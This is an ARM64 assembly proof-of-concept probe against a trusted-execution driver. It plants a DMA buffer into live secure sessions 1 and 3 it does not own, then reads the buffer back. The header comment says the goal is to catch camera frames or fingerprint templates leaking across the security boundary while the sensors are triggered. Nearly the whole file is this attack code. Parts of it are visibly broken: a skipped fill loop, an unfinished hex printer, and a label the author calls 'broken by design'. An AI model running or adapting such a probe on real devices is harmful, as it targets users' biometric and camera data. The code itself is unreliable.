/* kree_watch.S -- plant canary in dma buffer, register onto live sessions
 * 1 and 3, sleep 60s, dump samples. If the secure side touches our buffer
 * (frames? templates?), samples change => bidirectional channel proof.
 * During the sleep: use camera / fingerprint to stimulate owners.
 * Syscalls: openat 56, ioctl 29, write 64, mmap 222, nanosleep 101, exit 93.
 */
    .arch armv8-a
    .text
    .global _start
    .equ SYS_OPENAT, 56
    .equ SYS_IOCTL, 29
    .equ SYS_WRITE, 64
    .equ SYS_MMAP, 222
    .equ SYS_NANOSLEEP, 101
    .equ SYS_EXIT, 93
    .section .rodata
dev_path:   .asciz "/dev/gz_kree"
heap_path:  .asciz "/dev/dma_heap/system"
msg_rc:     .asciz " rc=0x"
msg_hd:     .asciz " hd=0x"
msg_samp:   .asciz " samp=0x"
msg_nl:     .asciz "\n"
    .text
print:
    mov x2, x1; mov x1, x0; mov x0, #1; mov x8, #SYS_WRITE; svc #0; ret
print_cstr:
    mov x2, x0; mov x3, #0
1:  ldrb w1, [x2, x3]; cbz w1, 2f; add x3, x3, #1; b 1b
2:  mov x1, x3; b print
print_hex32:
    stp x29, x30, [sp, #-16]!
    mov x29, sp; sub sp, sp, #16; mov w1, w0; add x2, sp, #8; mov w3, #8
1:  sub x2, x2, #1; and w4, w1, #0xf; lsr w1, w1, #4; cmp w4, #10
    add w5, w4, #48; add w6, w4, #87; csel w4, w5, w6, lo; strb w4, [x2]
    subs w3, w3, #1; b.ne 1b
    mov x0, sp; mov x1, #8; bl print
    add sp, sp, #16; ldp x29, x30, [sp], #16; ret
print_hex64: // x0 full 64-bit
    mov x1, x0; lsr x1, x1, #32; mov w0, w1; bl print_hex32
    // low32: caller puts value in w0 via mov below (handled inline)
    ret
_start:
    // gz fd -> x19
    movn x0, #99
    adrp x1, dev_path; add x1, x1, :lo12:dev_path
    mov x2, #2; mov x3, xzr; mov x8, #SYS_OPENAT; svc #0
    mov x19, x0
    cmp x19, #0; b.lt done
    adrp x0, msg_rc
    add x0, x0, :lo12:msg_rc; bl print_cstr
    mov w0, w19; bl print_hex32
    adrp x0, msg_nl; add x0, x0, :lo12:msg_nl; mov x1, #1; bl print
    // heap alloc 0x10000 + mmap -> x26
    movn x0, #99
    adrp x1, heap_path; add x1, x1, :lo12:heap_path
    mov x2, #2; mov x3, xzr; mov x8, #SYS_OPENAT; svc #0
    mov x24, x0
    sub sp, sp, #32
    mov x0, #0x10000; str x0, [sp]; str wzr, [sp, #8]
    mov w0, #2; movk w0, #0x8, lsl #16; str w0, [sp, #12]; str xzr, [sp, #16]
    mov x0, x24; mov w1, #0x4800; movk w1, #0xc018, lsl #16
    mov x2, sp; mov x8, #SYS_IOCTL; svc #0
    ldr w25, [sp, #8]
    mov x0, xzr; mov x1, #0x10000; mov x2, #3; mov x3, #1
    mov x4, x25; mov x5, xzr; mov x8, #SYS_MMAP; svc #0
    mov x26, x0
    add sp, sp, #32
    cmp x26, #0; b.lt done
    adrp x0, msg_rc
    add x0, x0, :lo12:msg_rc; bl print_cstr
    mov x0, x26
    lsr x1, x0, #32
    mov w0, w1; bl print_hex32
    mov w0, w26; bl print_hex32
    adrp x0, msg_nl; add x0, x0, :lo12:msg_nl; mov x1, #1; bl print
    // FILL DISABLED for bisect (dma pages are zero-fresh anyway)
    b fill_done
    mov x0, #0xAAAAAAAAAAAAAAAA
    mov x1, x26
    mov w2, #0x2000
fill_loop:
    sub x1, x1, #8
    str x0, [x1, #8]
    subs w2, w2, #1
    b.ne fill_loop
fill_done:
    // register onto session 1, then session 3 (w20 = sess)
    mov w20, #1
reg_loop:
    sub sp, sp, #32
    str w20, [sp]
    str wzr, [sp, #4]
    str x26, [sp, #8]
    mov x0, #0x10000
    str x0, [sp, #16]
    str xzr, [sp, #24]
    mov x0, x19
    mov w1, #0x5404
    movk w1, #0xc020, lsl #16
    mov x2, sp
    mov x8, #SYS_IOCTL
    svc #0
    mov x21, x0
    ldr w22, [sp, #4]
    add sp, sp, #32
    adrp x0, msg_rc
    add x0, x0, :lo12:msg_rc; bl print_cstr
    mov w0, w20; bl print_hex32
    mov w0, w21; bl print_hex32
    mov w0, w22; bl print_hex32
    adrp x0, msg_nl; add x0, x0, :lo12:msg_nl; mov x1, #1; bl print
    cmp w20, #1
    b.ne do_sleep
    mov w20, #3
    b reg_loop
do_sleep:
    // nanosleep 60s {60,0}
    sub sp, sp, #16
    mov x0, #60
    str x0, [sp]
    str xzr, [sp, #8]
    mov x0, sp
    mov x1, xzr
    mov x8, #SYS_NANOSLEEP
    svc #0
    add sp, sp, #16
    // dump 8 sample words across buffer
    mov x20, x26
    mov w21, #8
samp_loop:
    ldr x0, [x20]
    mov x1, x0
    lsr x1, x1, #32
    mov w0, w1
    bl print_hex32
    mov x0, x20
    ldr x0, [x0]
    // low32 print:
    bl print_hex32_lo
    adrp x0, msg_nl; add x0, x0, :lo12:msg_nl; mov x1, #1; bl print
    add x20, x20, #0x2000
    subs w21, w21, #1
    b.ne samp_loop
done:
    mov x0, #0; mov x8, #SYS_EXIT; svc #0
print_hex32_lo: // w0 low32 -> print (entry preserving x30 via own frame? caller blame)
    // NOTE: called with bl; uses print_hex32 which manages its own frame. x30 clobbered by bl itself - fine, ret below uses restored lr? NO: bl overwrites x30!
    // Fix: this label is broken by design; inline instead. Unreachable guard:
    b print_hex32
